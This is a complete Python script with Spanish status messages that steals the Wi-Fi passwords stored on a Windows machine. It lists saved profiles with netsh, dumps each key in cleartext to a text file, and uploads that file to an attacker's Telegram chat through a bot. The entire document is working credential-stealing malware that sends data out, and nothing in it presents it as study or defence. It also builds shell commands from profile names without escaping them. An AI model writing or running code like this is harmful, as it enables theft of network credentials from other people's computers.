import subprocess
import time 
import sys
import telebot

token = "TELEGRAM_BOT_TOKEN"
chat_id = "YOUR_CHAT_ID"

telegramBot = telebot.TeleBot(token)
telegramBot.send_message(chat_id, "Bot listo")

def show_SSID():
	Array = []
	with open("stdout.txt","w") as out:
		command = "netsh wlan show profiles"
		subprocess.run(command,stdout=out, shell=True);
		time.sleep(1)
		with open("stdout.txt","r") as out:
			for r in out:
				if r.find(" : ") != -1 :
					Array.append(r)
	return Array;

def search_SSID(array):
	i = 0;
	newArray = [];
	for x in array:
		z = x.find(":") + 1;
		for w in x:
			if i > z:
				newArray.append(w)
			i += 1;
		i = 0;
	return newArray;


def return_SSID(array):
	s = "";
	newArray = [];
	for x in array:
		if x != '\n':
			s += x 
		else:
			newArray.append(s)
			s = "";
	return newArray;


def save_Passwords(array):
	telegramBot.send_message(chat_id, "Preparando archivo txt...")
	for x in array:
		with open("ssid_paswords.txt", "a") as out:
			command = "netsh wlan show profile name=" + x + " key=clear"
			subprocess.run(command, stdout=out, shell=True)
			time.sleep(1)

	document = open('ssid_paswords.txt', 'rb')
	telegramBot.send_document(chat_id, document)

def main():
	showSSID = show_SSID();
	searchSSID = search_SSID(showSSID);
	returnSSID = return_SSID(searchSSID);
	save_Passwords(returnSSID);

if __name__ == "__main__":
    try: 
        main()
    except KeyboardInterrupt:
        sys.exit(0)
        exit()
    




#telegramBot = telebot.TeleBot(token)
#telegramBot.send_message(myId, "Bot kkññññlisto")